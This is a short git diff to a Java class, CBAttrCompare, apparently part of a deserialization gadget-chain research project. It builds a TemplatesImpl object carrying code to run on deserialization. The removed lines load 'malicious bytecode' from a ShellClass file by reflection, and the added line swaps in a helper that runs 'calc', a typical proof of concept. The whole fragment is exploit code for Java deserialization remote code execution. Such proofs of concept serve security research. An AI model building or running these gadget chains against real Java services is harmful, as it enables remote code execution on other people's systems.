@@ -1,5 +1,6 @@
 package Seri.CBGadgets;
 
+import Seri.Utils;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xerces.internal.dom.AttrImpl;
@@ -17,12 +18,7 @@ import static Seri.Utils.*;
 
 public class CBAttrCompare {
     public static void main(String[] args) throws Exception {
-        TemplatesImpl templates = new TemplatesImpl();
-        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));
-        setValue(templates,"_name","aaa");
-        // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
-        setValue(templates,"_bytecodes",new byte[][]{bytes});
-        setValue(templates,"_tfactory",new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         AttrNSImpl attr = new AttrNSImpl();
         attr.setValues(new CoreDocumentImpl() ,"1" ,"1" ,"1");
